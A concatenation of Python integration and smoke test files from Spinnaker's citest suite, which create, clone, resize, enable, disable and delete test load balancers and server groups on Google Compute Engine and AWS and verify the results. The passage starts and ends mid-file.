      'targetSize': 1,
      'capacity': {
        'min': 1,
        'max': 1,
        'desired': 1
      },
      'zone': self.TEST_ZONE,
      'network': 'default',
      'instanceMetadata': {'load-balancer-names': self.__lb_name},
      'availabilityZones': {self.TEST_REGION: [self.TEST_ZONE]},
      'cloudProvider': 'gce',
      'source': {
        'account': self.bindings['GCE_CREDENTIALS'],
        'region': self.TEST_REGION,
        'zone': self.TEST_ZONE,
        'serverGroupName': self.__server_group_name,
        'asgName': self.__server_group_name
      },
      'instanceType': 'f1-micro',
      'image': self.bindings['TEST_GCE_IMAGE_NAME'],
      'initialNumReplicas': 1,
      'loadBalancers': [self.__lb_name],
      'type': 'cloneServerGroup',
      'account': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Cloned', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .contains_path_value('baseInstanceName', self.__cloned_server_group_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - clone server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='clone_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def disable_server_group(self):
    job = [{
      'cloudProvider': 'gce',
      'asgName': self.__server_group_name,
      'serverGroupName': self.__server_group_name,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'type': 'disableServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Disabled', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .contains_path_value('baseInstanceName', self.__server_group_name)
     .excludes_pred_list([
         jc.PathContainsPredicate('baseInstanceName', self.__server_group_name),                    
         jc.PathContainsPredicate('targetPools', 'https')]))                    

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - disable server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='disable_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def enable_server_group(self):
    job = [{
      'cloudProvider': 'gce',
      'asgName': self.__server_group_name,
      'serverGroupName': self.__server_group_name,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'type': 'enableServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Enabled', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .contains_pred_list([
         jc.PathContainsPredicate('baseInstanceName', self.__server_group_name),                    
         jc.PathContainsPredicate('targetPools', 'https')]))                    

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - enable server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='enable_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def destroy_server_group(self, version):
    serverGroupName = '%s-%s' % (self.__cluster_name, version)
    job = [{
      'cloudProvider': 'gce',
      'asgName': serverGroupName,
      'serverGroupName': serverGroupName,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'type': 'destroyServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Destroyed', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .excludes_path_value('baseInstanceName', serverGroupName))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - destroy server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='destroy_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def delete_load_balancer(self):
    job = [{
      "loadBalancerName": self.__lb_name,
      "networkLoadBalancerName": self.__lb_name,
      "region": "us-central1",
      "type": "deleteLoadBalancer",
      "regions": ["us-central1"],
      "credentials": self.bindings['GCE_CREDENTIALS'],
      "cloudProvider": "gce",
      "user": "integration-tests"
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Load Balancer Created', retryable_for_secs=30)
     .list_resources('forwarding-rules')
     .excludes_path_value('name', self.__lb_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - delete load balancer',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='delete_load_balancer', data=payload, path=self.__path),
      contract=builder.build())


class GoogleServerGroupTest(st.AgentTestCase):
  def test_a_create_load_balancer(self):
    self.run_test_case(self.scenario.create_load_balancer())

  def test_b_create_server_group(self):
    self.run_test_case(self.scenario.create_instances())

  def test_c_resize_server_group(self):
    self.run_test_case(self.scenario.resize_server_group())

  def test_d_clone_server_group(self):
    self.run_test_case(self.scenario.clone_server_group(),
                       # TODO(ewiseblatt): 20160314
                       # There is a lock contention race condition
                       # in clouddriver that causes intermittent failure.
                       max_retries=5)

  def test_e_disable_server_group(self):
    self.run_test_case(self.scenario.disable_server_group())

  def test_f_enable_server_group(self):
    self.run_test_case(self.scenario.enable_server_group())

  def test_g_destroy_server_group_v000(self):
    self.run_test_case(self.scenario.destroy_server_group('v000'))

  def test_h_destroy_server_group_v001(self):
    self.run_test_case(self.scenario.destroy_server_group('v001'))

  def test_z_delete_load_balancer(self):
    self.run_test_case(self.scenario.delete_load_balancer())


def main():

  defaults = {
    'TEST_STACK': GoogleServerGroupTestScenario.DEFAULT_TEST_ID,
    'TEST_APP': 'gcpsvrgrptst' + GoogleServerGroupTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      GoogleServerGroupTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[GoogleServerGroupTest])


if __name__ == '__main__':
  sys.exit(main())

# Copyright 2015 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Smoke test to see if Spinnaker can interoperate with Google Cloud Platform.

See testable_service/integration_test.py and spinnaker_testing/spinnaker.py
for more details.

The smoke test will use ssh to peek at the spinnaker configuration
to determine the managed project it should verify, and to determine
the spinnaker account name to use when sending it commands.

Sample Usage:
    Assuming you have created $PASSPHRASE_FILE (which you should chmod 400)
    and $CITEST_ROOT points to the root directory of this repository
    (which is . if you execute this from the root)

  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/google_smoke_test.py \
    --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
    --gce_project=$PROJECT \
    --gce_zone=$ZONE \
    --gce_instance=$INSTANCE
or
  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/google_smoke_test.py \
    --native_hostname=host-running-smoke-test
    --managed_gce_project=$PROJECT \
    --test_gce_zone=$ZONE
"""

# Standard python modules.
import sys

# citest modules.
import citest.gcp_testing as gcp
import citest.json_contract as jc
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.gate as gate


class GoogleSmokeTestScenario(sk.SpinnakerTestScenario):
  """Defines the scenario for the smoke test.

  This scenario defines the different test operations.
  We're going to:
    Create a Spinnaker Application
    Create a Load Balancer
    Create a Server Group
    Delete each of the above (in reverse order)
  """

  @classmethod
  def new_agent(cls, bindings):
    """Implements citest.service_testing.AgentTestScenario.new_agent."""
    return gate.new_agent(bindings)

  @classmethod
  def initArgumentParser(cls, parser, defaults=None):
    """Initialize command line argument parser.

    Args:
      parser: argparse.ArgumentParser
    """
    super(GoogleSmokeTestScenario, cls).initArgumentParser(parser, defaults=defaults)

    defaults = defaults or {}
    parser.add_argument(
        '--test_component_detail',
        default='fe',
        help='Refinement for component name to create.')

  def __init__(self, bindings, agent=None):
    """Constructor.

    Args:
      bindings: [dict] The data bindings to use to configure the scenario.
      agent: [GateAgent] The agent for invoking the test operations on Gate.
    """
    super(GoogleSmokeTestScenario, self).__init__(bindings, agent)

    bindings = self.bindings
    bindings['TEST_APP_COMPONENT_NAME'] = (
        '{app}-{stack}-{detail}'.format(
            app=bindings['TEST_APP'],
            stack=bindings['TEST_STACK'],
            detail=bindings['TEST_COMPONENT_DETAIL']))

    # We'll call out the app name because it is widely used
    # because it scopes the context of our activities.
    # pylint: disable=invalid-name
    self.TEST_APP = bindings['TEST_APP']

  def create_app(self):
    """Creates OperationContract that creates a new Spinnaker Application."""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_create_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def delete_app(self):
    """Creates OperationContract that deletes a new Spinnaker Application."""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_delete_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def upsert_load_balancer(self):
    """Creates OperationContract for upsertLoadBalancer.

    Calls Spinnaker's upsertLoadBalancer with a configuration, then verifies
    that the expected resources and configurations are visible on GCE. See
    the contract builder for more info on what the expectations are.
    """
    bindings = self.bindings
    load_balancer_name = bindings['TEST_APP_COMPONENT_NAME']
    target_pool_name = '{0}/targetPools/{1}-tp'.format(
        bindings['TEST_GCE_REGION'], load_balancer_name)

    spec = {
        'checkIntervalSec': 9,
        'healthyThreshold': 3,
        'unhealthyThreshold': 5,
        'timeoutSec': 2,
        'port': 80
    }

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'gce',
            'provider': 'gce',
            'stack': bindings['TEST_STACK'],
            'detail': bindings['TEST_COMPONENT_DETAIL'],
            'credentials': bindings['GCE_CREDENTIALS'],
            'region': bindings['TEST_GCE_REGION'],
            'ipProtocol': 'TCP',
            'portRange': spec['port'],
            'loadBalancerName': load_balancer_name,
            'healthCheck': {
                'port': spec['port'],
                'timeoutSec': spec['timeoutSec'],
                'checkIntervalSec': spec['checkIntervalSec'],
                'healthyThreshold': spec['healthyThreshold'],
                'unhealthyThreshold': spec['unhealthyThreshold'],
            },
            'type': 'upsertLoadBalancer',
            'availabilityZones': {bindings['TEST_GCE_REGION']: []},
            'user': '[anonymous]'
        }],
        description='Create Load Balancer: ' + load_balancer_name,
        application=self.TEST_APP)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Health Check Added',
                                retryable_for_secs=30)
     .list_resources('http-health-checks')
     .contains_pred_list(
         [jc.PathContainsPredicate('name', '%s-hc' % load_balancer_name),                    
          jc.DICT_SUBSET(spec)]))                    
    (builder.new_clause_builder('Target Pool Added',
                                retryable_for_secs=30)
     .list_resources('target-pools')
     .contains_path_value('name', '%s-tp' % load_balancer_name))
    (builder.new_clause_builder('Forwarding Rules Added',
                                retryable_for_secs=30)
     .list_resources('forwarding-rules')
     .contains_pred_list([
          jc.PathContainsPredicate('name', load_balancer_name),                    
          jc.PathContainsPredicate('target', target_pool_name)]))                    

    return st.OperationContract(
        self.new_post_operation(
            title='upsert_load_balancer', data=payload, path='tasks'),
        contract=builder.build())

  def delete_load_balancer(self):
    """Creates OperationContract for deleteLoadBalancer.

    To verify the operation, we just check that the GCP resources
    created by upsert_load_balancer are no longer visible on GCP.
    """
    load_balancer_name = self.bindings['TEST_APP_COMPONENT_NAME']
    bindings = self.bindings
    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'deleteLoadBalancer',
            'cloudProvider': 'gce',
            'loadBalancerName': load_balancer_name,
            'region': bindings['TEST_GCE_REGION'],
            'regions': [bindings['TEST_GCE_REGION']],
            'credentials': bindings['GCE_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        description='Delete Load Balancer: {0} in {1}:{2}'.format(
            load_balancer_name,
            bindings['GCE_CREDENTIALS'],
            bindings['TEST_GCE_REGION']),
        application=self.TEST_APP)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Health Check Removed', retryable_for_secs=30)
     .list_resources('http-health-checks')
     .excludes_path_value('name', '%s-hc' % load_balancer_name))
    (builder.new_clause_builder('TargetPool Removed')
     .list_resources('target-pools')
     .excludes_path_value('name', '%s-tp' % load_balancer_name))
    (builder.new_clause_builder('Forwarding Rule Removed')
     .list_resources('forwarding-rules')
     .excludes_path_value('name', load_balancer_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_load_balancer', data=payload, path='tasks'),
        contract=builder.build())

  def create_server_group(self):
    """Creates OperationContract for createServerGroup.

    To verify the operation, we just check that Managed Instance Group
    for the server was created.
    """
    bindings = self.bindings

    # Spinnaker determines the group name created,
    # which will be the following:
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'gce',
            'application': self.TEST_APP,
            'credentials': bindings['GCE_CREDENTIALS'],
            'strategy':'',
            'capacity': {'min':2, 'max':2, 'desired':2},
            'targetSize': 2,
            'image': bindings['TEST_GCE_IMAGE_NAME'],
            'zone': bindings['TEST_GCE_ZONE'],
            'stack': bindings['TEST_STACK'],
            'instanceType': 'f1-micro',
            'type': 'createServerGroup',
            'loadBalancers': [bindings['TEST_APP_COMPONENT_NAME']],
            'availabilityZones': {
                bindings['TEST_GCE_REGION']: [bindings['TEST_GCE_ZONE']]
            },
            'instanceMetadata': {
                'startup-script': ('sudo apt-get update'
                                   ' && sudo apt-get install apache2 -y'),
                'load-balancer-names': bindings['TEST_APP_COMPONENT_NAME']
            },
            'account': bindings['GCE_CREDENTIALS'],
            'authScopes': ['compute'],
            'user': '[anonymous]'
        }],
        description='Create Server Group in ' + group_name,
        application=self.TEST_APP)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Managed Instance Group Added',
                                retryable_for_secs=30)
     .inspect_resource('managed-instance-groups', group_name)
     .contains_path_eq('targetSize', 2))

    return st.OperationContract(
        self.new_post_operation(
            title='create_server_group', data=payload, path='tasks'),
        contract=builder.build())

  def delete_server_group(self):
    """Creates OperationContract for deleteServerGroup.

    To verify the operation, we just check that the GCP managed instance group
    is no longer visible on GCP (or is in the process of terminating).
    """
    bindings = self.bindings
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    # TODO(ttomsu): Change this back from asgName to serverGroupName
    #               once it is fixed in orca.
    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'gce',
            'serverGroupName': group_name,
            'region': bindings['TEST_GCE_REGION'],
            'zone': bindings['TEST_GCE_ZONE'],
            'asgName': group_name,
            'type': 'destroyServerGroup',
            'regions': [bindings['TEST_GCE_REGION']],
            'zones': [bindings['TEST_GCE_ZONE']],
            'credentials': bindings['GCE_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        application=self.TEST_APP,
        description='DestroyServerGroup: ' + group_name)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Managed Instance Group Removed')
     .inspect_resource('managed-instance-groups', group_name,
                       no_resource_ok=True)
     .contains_path_eq('targetSize', 0))

    (builder.new_clause_builder('Instances Are Removed',
                                retryable_for_secs=30)
     .list_resources('instances')
     .excludes_path_value('name', group_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_server_group', data=payload, path='tasks'),
        contract=builder.build())


class GoogleSmokeTest(st.AgentTestCase):
  """The test fixture for the SmokeTest.

  This is implemented using citest OperationContract instances that are
  created by the GoogleSmokeTestScenario.
  """
  # pylint: disable=missing-docstring

  def test_a_create_app(self):
    self.run_test_case(self.scenario.create_app())

  def test_b_upsert_load_balancer(self):
    self.run_test_case(self.scenario.upsert_load_balancer())

  def test_c_create_server_group(self):
    # We'll permit this to timeout for now
    # because it might be waiting on confirmation
    # but we'll continue anyway because side effects
    # should have still taken place.
    self.run_test_case(self.scenario.create_server_group(), timeout_ok=True)

  def test_x_delete_server_group(self):
    self.run_test_case(self.scenario.delete_server_group(), max_retries=5)

  def test_y_delete_load_balancer(self):
    self.run_test_case(self.scenario.delete_load_balancer(),
                       max_retries=5)

  def test_z_delete_app(self):
    # Give a total of a minute because it might also need
    # an internal cache update
    self.run_test_case(self.scenario.delete_app(),
                       retry_interval_secs=8, max_retries=8)


def main():
  """Implements the main method running this smoke test."""

  defaults = {
      'TEST_STACK': str(GoogleSmokeTestScenario.DEFAULT_TEST_ID),
      'TEST_APP': 'gcpsmoketest' + GoogleSmokeTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      GoogleSmokeTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[GoogleSmokeTest])


if __name__ == '__main__':
  sys.exit(main())

# Copyright 2015 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Tests to see if CloudDriver/Kato can interoperate with Amazon Web Services.

Sample Usage:
    Assuming you have created $PASSPHRASE_FILE (which you should chmod 400):
    and $CITEST_ROOT points to the root directory of this repository
    (which is . if you execute this from the root)
    and $AWS_PROFILE is the name of the aws_cli profile for authenticating
    to observe aws resources:

    This first command would be used if Spinnaker itself was deployed on GCE.
    The test needs to talk to GCE to get to spinnaker (using the gce_* params)
    then talk to AWS (using the aws_profile with the aws cli program) to
    verify Spinnaker had the right effects on AWS.

    PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
       python $CITEST_ROOT/spinnaker/spinnaker_system/aws_kato_test.py \
       --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
       --gce_project=$PROJECT \
       --gce_zone=$GCE_ZONE \
       --gce_instance=$INSTANCE \
       --test_aws_zone=$AWS_ZONE \
       --aws_profile=$AWS_PROFILE

   or

     This second command would be used if Spinnaker itself was deployed some
     place reachable through a direct IP connection. It could be, but is not
     necessarily deployed on GCE. It is similar to above except it does not
     need to go through GCE and its firewalls to locate the actual IP endpoints
     rather those are already known and accessible.

     PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
       python $CITEST_ROOT/spinnaker/spinnaker_system/aws_kato_test.py \
       --native_hostname=host-running-kato
       --test_aws_zone=$AWS_ZONE \
       --aws_profile=$AWS_PROFILE

   Note that the $AWS_ZONE is not directly used, rather it is a standard
   parameter being used to infer the region. The test is going to pick
   some different availability zones within the region in order to test kato.
   These are currently hardcoded in.
"""

# Standard python modules.
import sys

# citest modules.
import citest.aws_testing as aws
import citest.json_contract as jc                    
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.kato as kato


class AwsKatoTestScenario(sk.SpinnakerTestScenario):
  """Defines the scenario for the test.

  This scenario defines the different test operations.
  We're going to:
    Create a Load Balancer
    Delete a Load Balancer
  """

  __use_lb_name = ''     # The load balancer name.

  @classmethod
  def new_agent(cls, bindings):
    """Implements the base class interface to create a new agent.

    This method is called by the base classes during setup/initialization.

    Args:
      bindings: The bindings dictionary with configuration information
        that this factory can draw from to initialize. If the factory would
        like additional custom bindings it could add them to initArgumentParser.

    Returns:
      A citest.service_testing.BaseAgent that can interact with Kato.
      This is the agent that test operations will be posted to.
    """
    return kato.new_agent(bindings)

  def upsert_load_balancer(self):
    """Creates OperationContract for upsertLoadBalancer.

    Calls Spinnaker's upsertLoadBalancer with a configuration, then verifies
    that the expected resources and configurations are visible on AWS. See
    the contract builder for more info on what the expectations are.
    """
    detail_raw_name = 'katotestlb' + self.test_id
    self.__use_lb_name = detail_raw_name

    bindings = self.bindings
    region = bindings['TEST_AWS_REGION']
    avail_zones = [region + 'a', region + 'b']

    listener = {
        'Listener': {
            'InstancePort':7001,
            'LoadBalancerPort':80
        }
    }
    health_check = {
        'HealthyThreshold':8,
        'UnhealthyThreshold':3,
        'Interval':123,
        'Timeout':12,
        'Target':'HTTP:%d/healthcheck' % listener['Listener']['InstancePort']
    }

    payload = self.agent.type_to_payload(
        'upsertAmazonLoadBalancerDescription',
        {
            'credentials': bindings['AWS_CREDENTIALS'],
            'clusterName': bindings['TEST_APP'],
            'name': detail_raw_name,
            'availabilityZones': {region: avail_zones},
            'listeners': [{
                'internalProtocol': 'HTTP',
                'internalPort': listener['Listener']['InstancePort'],
                'externalProtocol': 'HTTP',
                'externalPort': listener['Listener']['LoadBalancerPort']
            }],
            'healthCheck': health_check['Target'],
            'healthTimeout': health_check['Timeout'],
            'healthInterval': health_check['Interval'],
            'healthyThreshold': health_check['HealthyThreshold'],
            'unhealthyThreshold': health_check['UnhealthyThreshold']
        })

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Added', retryable_for_secs=30)
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', self.__use_lb_name])
     .contains_pred_list([
         jc.PathContainsPredicate(                    
             'LoadBalancerDescriptions/HealthCheck', health_check),
         jc.PathPredicate(                    
             'LoadBalancerDescriptions/AvailabilityZones',                    
             jc.LIST_SIMILAR(avail_zones)),                    
         jc.PathElementsContainPredicate(                    
             'LoadBalancerDescriptions/ListenerDescriptions', listener)
         ])
    )

    return st.OperationContract(
        self.new_post_operation(
            title='upsert_amazon_load_balancer', data=payload, path='ops'),
        contract=builder.build())

  def delete_load_balancer(self):
    """Creates OperationContract for deleteLoadBalancer.

    To verify the operation, we just check that the AWS resources
    created by upsert_load_balancer are no longer visible on AWS.
    """
    region = self.bindings['TEST_AWS_REGION']
    payload = self.agent.type_to_payload(
        'deleteAmazonLoadBalancerDescription',
        {
            'credentials': self.bindings['AWS_CREDENTIALS'],
            'regions': [region],
            'loadBalancerName': self.__use_lb_name
        })

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Removed')
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', self.__use_lb_name],
         no_resources_ok=True)
     .excludes_path_value('LoadBalancerName', self.__use_lb_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_amazon_load_balancer', data=payload, path='ops'),
        contract=builder.build())


class AwsKatoIntegrationTest(st.AgentTestCase):
  """The test fixture for the SmokeTest.

  This is implemented using citest OperationContract instances that are
  created by the AwsKatoTestScenario.
  """
  # pylint: disable=missing-docstring

  def test_a_upsert_load_balancer(self):
    self.run_test_case(self.scenario.upsert_load_balancer())

  def test_z_delete_load_balancer(self):
    self.run_test_case(self.scenario.delete_load_balancer())


def main():
  """Implements the main method running this smoke test."""

  defaults = {
      'TEST_APP': 'awskatotest' + AwsKatoTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      AwsKatoTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[AwsKatoIntegrationTest])


if __name__ == '__main__':
  sys.exit(main())

# Copyright 2016 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Smoke test to see if Spinnaker can interoperate with Amazon Web Services.

See testable_service/integration_test.py and spinnaker_testing/spinnaker.py
for more details.

The smoke test will use ssh to peek at the spinnaker configuration
to determine the managed project it should verify, and to determine
the spinnaker account name to use when sending it commands.

Sample Usage:
    Assuming you have created $PASSPHRASE_FILE (which you should chmod 400)
    and $CITEST_ROOT points to the root directory of this repository
    (which is . if you execute this from the root)

  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/smoke_test.py \
    --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
    --gce_project=$PROJECT \
    --gce_zone=$ZONE \
    --gce_instance=$INSTANCE
    --test_aws_zone=$AWS_ZONE \
    --aws_profile=$AWS_PROFILE
or
  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/smoke_test.py \
    --native_hostname=host-running-smoke-test
    --test_aws_zone=$AWS_ZONE \
    --aws_profile=$AWS_PROFILE

  Note that the $AWS_ZONE is not directly used, rather it is a standard
  parameter being used to infer the region. The test is going to pick
  some different availability zones within the region in order to test kato.
  These are currently hardcoded in.
"""

# Standard python modules.
import sys

# citest modules.
import citest.aws_testing as aws
import citest.json_contract as jc
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.gate as gate


class AwsSmokeTestScenario(sk.SpinnakerTestScenario):
  """Defines the scenario for the smoke test.

  This scenario defines the different test operations.
  We're going to:
    Create a Spinnaker Application
    Create a Load Balancer
    Create a Server Group
    Delete each of the above (in reverse order)
  """

  @classmethod
  def new_agent(cls, bindings):
    """Implements citest.service_testing.AgentTestScenario.new_agent."""
    return gate.new_agent(bindings)

  @classmethod
  def initArgumentParser(cls, parser, defaults=None):
    """Initialize command line argument parser.

    Args:
      parser: argparse.ArgumentParser
    """
    super(AwsSmokeTestScenario, cls).initArgumentParser(parser,
                                                        defaults=defaults)

    defaults = defaults or {}
    parser.add_argument(
        '--test_component_detail',
        default='fe',
        help='Refinement for component name to create.')

  def __init__(self, bindings, agent=None):
    """Constructor.

    Args:
      bindings: [dict] The data bindings to use to configure the scenario.
      agent: [GateAgent] The agent for invoking the test operations on Gate.
    """
    super(AwsSmokeTestScenario, self).__init__(bindings, agent)

    bindings = self.bindings
    bindings['TEST_APP_COMPONENT_NAME'] = (
        '{app}-{stack}-{detail}'.format(
            app=bindings['TEST_APP'],
            stack=bindings['TEST_STACK'],
            detail=bindings['TEST_COMPONENT_DETAIL']))

    # We'll call out the app name because it is widely used
    # because it scopes the context of our activities.
    # pylint: disable=invalid-name
    self.TEST_APP = bindings['TEST_APP']

  def create_app(self):
    """Creates OperationContract that creates a new Spinnaker Application."""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_create_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def delete_app(self):
    """Creates OperationContract that deletes a new Spinnaker Application."""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_delete_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def upsert_load_balancer(self, use_vpc):
    """Creates OperationContract for upsertLoadBalancer.

    Calls Spinnaker's upsertLoadBalancer with a configuration, then verifies
    that the expected resources and configurations are visible on AWS. See
    the contract builder for more info on what the expectations are.

    Args:
      use_vpc: [bool] if True configure a VPC otherwise dont.
    """
    bindings = self.bindings
    load_balancer_name = bindings['TEST_APP_COMPONENT_NAME']

    # We're assuming that the given region has 'A' and 'B' availability
    # zones. This seems conservative but might be brittle since we permit
    # any region.
    region = bindings['TEST_AWS_REGION']
    avail_zones = [region + 'a', region + 'b']

    if use_vpc:
      # TODO(ewiseblatt): 20160301
      # We're hardcoding the VPC here, but not sure which we really want.
      # I think this comes from the spinnaker.io installation instructions.
      # What's interesting about this is that it is a 10.* CidrBlock,
      # as opposed to the others, which are public IPs. All this is sensitive
      # as to where the TEST_AWS_VPC_ID came from so this is going to be
      # brittle. Ideally we only need to know the vpc_id and can figure the
      # rest out based on what we have available.
      subnet_type = 'internal (defaultvpc)'
      vpc_id = bindings['TEST_AWS_VPC_ID']

      # Not really sure how to determine this value in general.
      security_groups = ['default']

      # The resulting load balancer will only be available in the zone of
      # the subnet we are using. We'll figure that out by looking up the
      # subnet we want.
      subnet_details = self.aws_observer.get_resource_list(
          root_key='Subnets',
          aws_command='describe-subnets',
          aws_module='ec2',
          args=['--filters',
                'Name=vpc-id,Values={vpc_id}'
                ',Name=tag:Name,Values=defaultvpc.internal.{region}'
                .format(vpc_id=vpc_id, region=region)])
      try:
        expect_avail_zones = [subnet_details[0]['AvailabilityZone']]
      except KeyError:
        raise ValueError('vpc_id={0} appears to be unknown'.format(vpc_id))
    else:
      subnet_type = ""
      vpc_id = None
      security_groups = None
      expect_avail_zones = avail_zones

      # This will be a second load balancer not used in other tests.
      # Decorate the name so as not to confuse it.
      load_balancer_name += '-pub'


    listener = {
        'Listener': {
            'InstancePort':80,
            'LoadBalancerPort':80
        }
    }
    health_check = {
        'HealthyThreshold': 8,
        'UnhealthyThreshold': 3,
        'Interval': 12,
        'Timeout': 6,
        'Target':'HTTP:%d/' % listener['Listener']['InstancePort']
    }

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'upsertLoadBalancer',
            'cloudProvider': 'aws',
            # 'loadBalancerName': load_balancer_name,


            'credentials': bindings['AWS_CREDENTIALS'],
            'name': load_balancer_name,
            'stack': bindings['TEST_STACK'],
            'detail': '',
            'region': bindings['TEST_AWS_REGION'],

            'availabilityZones': {region: avail_zones},
            'regionZones': avail_zones,
            'listeners': [{
                'internalProtocol': 'HTTP',
                'internalPort': listener['Listener']['InstancePort'],
                'externalProtocol': 'HTTP',
                'externalPort': listener['Listener']['LoadBalancerPort']
            }],
